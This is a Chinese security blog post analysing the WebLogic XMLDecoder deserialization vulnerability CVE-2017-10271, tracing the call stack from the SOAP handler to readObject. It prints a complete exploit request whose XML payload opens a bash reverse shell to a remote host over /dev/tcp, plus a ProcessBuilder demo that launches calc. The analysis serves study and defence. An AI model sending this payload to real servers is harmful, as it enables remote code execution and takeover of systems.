# CVE-2017-10271——WebLogic-Xml反序列化初探

阅读量 **247513**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-03-10 15:30:53

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t0185aa4ac49f443c53.jpg)

## 一、原理

###  （一）概述

WebLogic对POST类型的XML请求未做有效的过滤防范，导致了XMLDecoder反序列化漏洞。

###  （二）CVE-2017-10271

CVE-2017-10271与CVE-2017-3506的漏洞原理是一样的，即WebLogic对恶意的XML请求防范的不够严密。

###  （三）原理

**1.原理**

和之前接触过的php的xml注入有点像，

根本成因在于没有对输入的xml做有效的过滤，导致了任意代码执行，故整个流程涉及到两个部分，一是我们输入的xml是怎么进入到反序列化点的，二是payload在反序列化点是怎么导致任意代码执行的。

**2.payload**

网上流传的payload如下，

    
    
    POST /wls-wsat/CoordinatorPortType HTTP/1.1
    Host: 192.168.43.64:7001
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: text/xml
    Content-Length: 639
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java version="1.4.0" class="java.beans.XMLDecoder">
    <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
    <void index="0">
    <string>/bin/bash</string>
    </void>
    <void index="1">
    <string>-c</string>
    </void>
    <void index="2">
    <string>bash -i &gt;&amp; /dev/tcp/192.168.43.171/6666 0&gt;&amp;1</string>
    </void>
    </array>
    <void method="start"/></void>
    </java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>
    

## 二、调试

###  （一）环境搭建

可以直接使用vulhub的docker进行搭建，这里还是推荐这个良心博客，

[IDEA+docker，进行远程漏洞调试（weblogic） – ph4nt0mer –
博客园](https://www.cnblogs.com/ph4nt0mer/archive/2019/10/31/11772709.html)

###  （二）复现

burp拦截包，改之，

![](https://p2.ssl.qhimg.com/t0159529ee3293fe9ac.png)

成功执行，得到反向shell。

![](https://p5.ssl.qhimg.com/t01c59f1ff42dfc9ce6.png)

###  （三）调试

先上完整调用栈，比较深，人为分成几个部分，

    
    
    readObject:206, XMLDecoder (java.beans)
    readUTF:111, WorkContextXmlInputAdapter (weblogic.wsee.workarea)
    readEntry:92, WorkContextEntryImpl (weblogic.workarea.spi)
    receiveRequest:179, WorkContextLocalMap (weblogic.workarea)
    receiveRequest:163, WorkContextMapImpl (weblogic.workarea)
    receive:71, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)
    
    readHeaderOld:107, WorkContextTube (weblogic.wsee.jaxws.workcontext)
    processRequest:43, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)
    __doRun:866, Fiber (com.sun.xml.ws.api.pipe)
    _doRun:815, Fiber (com.sun.xml.ws.api.pipe)
    doRun:778, Fiber (com.sun.xml.ws.api.pipe)
    runSync:680, Fiber (com.sun.xml.ws.api.pipe)
    
    process:403, WSEndpointImpl$2 (com.sun.xml.ws.server)
    handle:539, HttpAdapter$HttpToolkit (com.sun.xml.ws.transport.http)
    handle:253, HttpAdapter (com.sun.xml.ws.transport.http)
    handle:140, ServletAdapter (com.sun.xml.ws.transport.http.servlet)
    handle:171, WLSServletAdapter (weblogic.wsee.jaxws)
    
    run:708, HttpServletAdapter$AuthorizedInvoke (weblogic.wsee.jaxws)
    doAs:363, AuthenticatedSubject (weblogic.security.acl.internal)
    runAs:146, SecurityManager (weblogic.security.service)
    authenticatedInvoke:103, ServerSecurityHelper (weblogic.wsee.util)
    run:311, HttpServletAdapter$3 (weblogic.wsee.jaxws)
    post:336, HttpServletAdapter (weblogic.wsee.jaxws)
    doRequest:99, JAXWSServlet (weblogic.wsee.jaxws)
    service:99, AbstractAsyncServlet (weblogic.servlet.http)
    service:820, HttpServlet (javax.servlet.http)
    run:227, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)
    invokeServlet:125, StubSecurityHelper (weblogic.servlet.internal)
    execute:301, ServletStubImpl (weblogic.servlet.internal)
    execute:184, ServletStubImpl (weblogic.servlet.internal)
    wrapRun:3732, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)
    run:3696, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)
    doAs:321, AuthenticatedSubject (weblogic.security.acl.internal)
    runAs:120, SecurityManager (weblogic.security.service)
    securedExecute:2273, WebAppServletContext (weblogic.servlet.internal)
    execute:2179, WebAppServletContext (weblogic.servlet.internal)
    run:1490, ServletRequestImpl (weblogic.servlet.internal)
    execute:256, ExecuteThread (weblogic.work)
    run:221, ExecuteThread (weblogic.work)
    

**1.readObj缘何引发命令执行？**

这一小节需要关注的是调用readObject时发生了什么，但也这里不会研究的特别深入，只简单的看下关键点，调用栈的前三段（即怎么进入的readObject）放到下一小节。  
先简单看下Java中xml的结构，来个简单的demo，

    
    
    import java.beans.XMLEncoder;
    import java.io.BufferedOutputStream;
    import java.io.FileNotFoundException;
    import java.io.FileOutputStream;
    import java.util.HashMap;
    
    public class DemoOut {
        public static void main(String[] args) throws FileNotFoundException {
            HashMap<Object, Object> map = new HashMap<>();
            map.put("arr", new String[3]);
            XMLEncoder e = new XMLEncoder(new BufferedOutputStream(new FileOutputStream("demo.xml")));
            e.writeObject(map);
            e.close();
        }
    }
    

得到的demo.xml如下，

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <java version="1.8.0_151" class="java.beans.XMLDecoder">
     <object class="java.util.HashMap">
      <void method="put">
       <string>arr</string>
       <array class="java.lang.String" length="3"/>
      </void>
     </object>
    </java>
    

这其中，object标签表示对象；void标签表示函数调用、赋值等操作， 里面的method 属性指定方法名称； array标签表示数组，
里面的class属性指定具体类。  
我们再来读取一下这个xml文件，

    
    
    import java.beans.XMLDecoder;
    import java.io.BufferedInputStream;
    import java.io.FileInputStream;
    import java.io.FileNotFoundException;
    
    public class DemoIn {
        public static void main(String[] args) throws FileNotFoundException {
            XMLDecoder d = new XMLDecoder(new BufferedInputStream(new FileInputStream("demo.xml")));
            Object demo = d.readObject();
            d.close();
        }
    }
    

我们在调试的过程中，可以看到以下两个比较有价值的过程点，

一是此处生成一个表达式对象，其中会调用HashMap的put将arr给put进去，

![](https://p0.ssl.qhimg.com/t0162f043c71c84e0bf.png)

最终反序列化恢复成为一个我们最开始构建的对象，

![](https://p2.ssl.qhimg.com/t01ad01ec5da569c3c2.png)

我们可以想象，此处的void标签可以表示HashMap对象的put()函数的调用，也应该可以标识其它类的其它函数的调用。  
比如，如果我们将demo.xml中的对象由HashMap改为可以执行命令的函数，再赋予适当的参数，就有可能执行恶意功能。  
有如下这般xml一个，

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <java version="1.8.0_151" class="java.beans.XMLDecoder">
     <object class="java.lang.ProcessBuilder">
      <array class="java.lang.String" length="1">
       <void index="0">
        <string>calc</string>
       </void>
      </array>
      <void method="start"/>
     </object>
    </java>
    

再执行刚才的java，

![](https://p1.ssl.qhimg.com/t01c279d72474d24f5d.png)

可以看到calc已经被执行。  
我们在刚才的Expression处下断，

![](https://p1.ssl.qhimg.com/t0181ed016b9dc5db0a.png)

当执行完create()之后，即会弹出计算器。

![](https://p4.ssl.qhimg.com/t015bfd416aa4493899.png)

**2.数据怎样进入readObject？**

前面我们看到，如果未对传入readObject的xml做过滤，就有可能引发命令执行。下面我们结合调用栈，看一下我们构造好的恶意数据能否绕过可能的防护，进入readObject。

**(1)handle到process**

首先是WLSServletAdapter.handle(),

![](https://p0.ssl.qhimg.com/t019694a9b210be207d.png)

查看该函数，

![](https://p3.ssl.qhimg.com/t011da64a318559cab9.png)

通过payload
可以看出，我们发的是post类型的包，这里直接走到最下面的super.handle()，即ServletAdapter.handle()，

![](https://p4.ssl.qhimg.com/t018f12f5212eccf591.png)

其中又调用了它的super.handle()，即HttpAdapter.handle(),

![](https://p1.ssl.qhimg.com/t01fd1f0876917aa3e0.png)

其中的createConnection()用于创建server applet连接，这只是一个常规的流程而已，略过，  
跟进HttpAdapter.handle(),

![](https://p3.ssl.qhimg.com/t01c5a87f42d837cad5.png)

这里同样会越过if，下面的几行都是些常规流程，我们要关注的是我们发送的数据包（中的payload）在Server端的处理流程，  
看到这里，

![](https://p5.ssl.qhimg.com/t010c62d8cab7d47e9d.png)

HttpToolkit会调用handle()，

![](https://p3.ssl.qhimg.com/t012fe97587f018b183.png)

这里可以猜测，ToolKit的作用是将我们发过来的数据包转化成Java中可以接受处理的Java对象，  
这里看到，

    
    
                        packet = HttpAdapter.this.decodePacket(con, this.codec);
    

这一行的意义比较明显，从函数名即可看出，是解码数据包的，其中很有可能有重要的操作，而且我们需要关注它来确认我们的数据包（其实主要是payload）是否被传了进来，

![](https://p1.ssl.qhimg.com/t015581db8d4c817e6c.png)

查看codec，发现是个text/xml类型的数据包，  
跟进HttpToolkit.decodePacket()，

![](https://p2.ssl.qhimg.com/t01308901e6eddb4d5f.png)

可以看到，其中多为赋值操作（可以关注下InputStream in =
con.getInput();），这一部分是对数据包的解析，也是对Java对象的初始化，  
经过赋值，我们可以得到这样的一个对象，

![](https://p5.ssl.qhimg.com/t01ff24f5a231ef54a7.png)

下面的if无法进入，

![](https://p2.ssl.qhimg.com/t010e18e62360f94a72.png)

于是我们会进入到codec.decode(in, ct, packet);（同时我们看到，执行完这一步就会return
packet，即解析好的Java对象），  
此时的in如下，

![](https://p1.ssl.qhimg.com/t01af0ba4dabafac671.png)

可以看到，其buf字段即为我们的payload，  
继续跟进SOAPBindingCodec.decode()，

![](https://p4.ssl.qhimg.com/t010b98f765519f7dc4.png)

向下跟进几步，

![](https://p1.ssl.qhimg.com/t01f550c87b06b7cb95.png)

最终进入到this.xmlSoapCodec.decode(in, contentType, packet);处

![](https://p3.ssl.qhimg.com/t0195b69087bed1e7f6.png)

进入到StreamSOAPCodec.decode()，

![](https://p0.ssl.qhimg.com/t017e2656f770af83a8.png)

跟进重载函数，

![](https://p3.ssl.qhimg.com/t010e8e91cf44960b27.png)

可以看到，此处的expectedContentTypes只有text/xml，

![](https://p4.ssl.qhimg.com/t01fc734647355303ef.png)

isContentTypeSupported()主要是一个比较、检查的功能，不需要多关注，

![](https://p5.ssl.qhimg.com/t012a962ba3f7425462.png)

步出，继续执行StreamSOAPCodec.decode()，又有字符集的检查，

![](https://p1.ssl.qhimg.com/t0107e2bc381d0bf7b3.png)

大概意思就是，如果类型和字符集的检查没什么问题，就要赋值了，  
这一步执行之前，  
packet如下，

![](https://p4.ssl.qhimg.com/t018958a8eef692face.png)

in的buf字段如下，

![](https://p4.ssl.qhimg.com/t01069a315b97348217.png)

执行完这一步后，

![](https://p3.ssl.qhimg.com/t013e4c61fa67f8f1e7.png)

message已被赋值，

步出到HttpAdapter.decodePacket()，  
到此我们看到，即将退出HttpAdapter.decodePacket()，packet已经构造好。

![](https://p4.ssl.qhimg.com/t014a176c2b9fedd9ed.png)

![](https://p4.ssl.qhimg.com/t01da8acfb6e9428a9e.png)

这一部分的调用栈如下，

    
    
    decode:315, StreamSOAPCodec (com.sun.xml.ws.encoding)
    decode:151, StreamSOAPCodec (com.sun.xml.ws.encoding)
    decode:290, SOAPBindingCodec (com.sun.xml.ws.encoding)
    decodePacket:294, HttpAdapter (com.sun.xml.ws.transport.http)
    access$500:102, HttpAdapter (com.sun.xml.ws.transport.http)
    
    handle:519, HttpAdapter$HttpToolkit (com.sun.xml.ws.transport.http)
    
    handle:253, HttpAdapter (com.sun.xml.ws.transport.http)
    handle:140, ServletAdapter (com.sun.xml.ws.transport.http.servlet)
    handle:171, WLSServletAdapter (weblogic.wsee.jaxws)
    

我们现在正处于HttpAdapter$HttpToolkit.handle()内，HttpAdapter$HttpToolkit.handle()的前半部分（主要是packet
= HttpAdapter.this.decodePacket(con, this.codec);一句）完成了数据包的解析，并将其转化成对应的Java对象。

**(2)Process到receive**

继续看HttpAdapter$HttpToolkit.handle()，

![](https://p2.ssl.qhimg.com/t01fffa5e6f81beebde.png)

此时packet已经赋值完毕，我们的数据包被解析成了Java的对象，

![](https://p1.ssl.qhimg.com/t011bd3c767a0ac1806.png)

可以看到，我们的payload已经在其中了，  
向下走，我们会走到 this.head.process这里，

![](https://p2.ssl.qhimg.com/t013d7a63dfabe29c19.png)

顾名思义，此处应该是对packet进行处理，这里可能会对我们的数据包（或曰此处的对象）产生影响，使之不能顺利的抵达readObject()，我们跟进查看，

其中先是一些赋值操作，我认为对我们最后的结果没有实质的影响，因为从上面可以看到，我们的payload存于message.reader.closeableSource.delegate.in.buf字段，最后解析来getshell时主要也是靠的这个字段。以此观之，这一段代码并没有什么影响。

接下来走到fiber.runSync()这里，

![](https://p0.ssl.qhimg.com/t01fd013ea9f38694ca.png)

下面就要return response了，这里有必要跟进去看下，  
此处的this是个Fiber对象，

![](https://p2.ssl.qhimg.com/t01fc0e1dbb4731e46c.png)

经过赋值，this.packet变成了我们的数据包，

![](https://p5.ssl.qhimg.com/t01c66c1cdee79abf6e.png)

接下来可以关注this.packet，  
我们看这个函数的下半段，

![](https://p0.ssl.qhimg.com/t01d658751cf39cf994.png)

我们看到，这里直接将var7赋值为this.packet，然后再无处理，直到var7被return 成为response，  
所以，我们应该跟入this.doRun()，其内部可能有对packet的处理，影响var7，进而影响返回值。  
接下来，需要跟入this._doRun()，

![](https://p0.ssl.qhimg.com/t01d4e7205a854a76ce.png)

前面的几个if-else嵌套没有实际的作用，都会跳出，

![](https://p4.ssl.qhimg.com/t01e920cac1811f98e1.png)

最终到达这里，

![](https://p5.ssl.qhimg.com/t0134e277fd522a07fe.png)

此时各变量的情况如下，

![](https://p5.ssl.qhimg.com/t01aa4c3973c30617aa.png)

结合前面的调用栈来看，WorkContextServerTube.processRequest()才是触发漏洞的一环，而非此处的WseeServerTube，

重复走几轮循环，直到this.next为我们想要的对象，

![](https://p3.ssl.qhimg.com/t01ab543b05714fdadc.png)

步入processRequest()，可以看到这里主要还是提取出一些值来，

![](https://p2.ssl.qhimg.com/t01270e9e2667d2fc1f.png)

![](https://p0.ssl.qhimg.com/t01cd81f60dea079173.png)

接下来会进入readHeaderOld()，

![](https://p3.ssl.qhimg.com/t0186a1335d746f3180.png)

跟进，

![](https://p1.ssl.qhimg.com/t016725af3678956da1.png)

可以看到，var4作为一个ByteArray，存储了payload对应的字符串，接下来var6将一var4为参数构建一个WorkContextXmlInputAdapter，再往后就是this.receive(var6)，根据调用栈的提示，我们应该跟进之。

**(3)receive到readObject**

前面的调试过程中应该来讲没有对我们传给this.receive()的var6（携带的payload）产生实质影响，从调用栈我们可以明确从receive到最后的readObject主要经历的有哪些函数，下面我们可以着重观察这几步流程，
关注的重点有二：一是传入readObject的参数为何物，二是这部分流程有没有对这个参数做处理（主要为检查、过滤）。

先进入WorkContextServerTube.receive()，

![](https://p2.ssl.qhimg.com/t017cc11d8b0d970d84.png)

没有过滤，继续跟进，

![](https://p0.ssl.qhimg.com/t014e7d1c71f822a2e9.png)

看不出什么，继续跟进WorkContextLocalMap.receiveRequest()，

![](https://p3.ssl.qhimg.com/t013aaa81fdd8f6ca24.png)

若有处理，也只能在WorkContextEntryImpl.readEntry()中，于是跟进之，

![](https://p1.ssl.qhimg.com/t017b4444a5b9a05c06.png)

跟进WorkContextXmlInputAdapter.readUTF()，

![](https://p2.ssl.qhimg.com/t01f57492930e0d4c73.png)

可以看到，这里直接调用了this.xmlDecoder.readObject()，到此也没有做任何过滤，漏洞由此产生。

## 三、收获与启示

这个漏洞看起来有些复杂，但其实原理较为直接，与之类似的漏洞也有一些。个人感觉，XML的漏洞和WebLogic的反序列化漏洞都有着思路上的共同点：先找到一个可以触发RCE的点，然后不停的尝试，从我们的输入点能否达到它。实现这个思路的具体方法会有差异，这就是这其中每个漏洞的特点了。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **northind** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/231484](/post/id/231484)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Weblogic](/tag/Weblogic)
  * [xml](/tag/xml)
  * [反序列化](/tag/反序列化)
  * [双倍活动](/tag/双倍活动)

 **+1** __3赞

 __收藏

![](https://p4.ssl.qhimg.com/t01f28ccab3282fc24b.png) northind

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

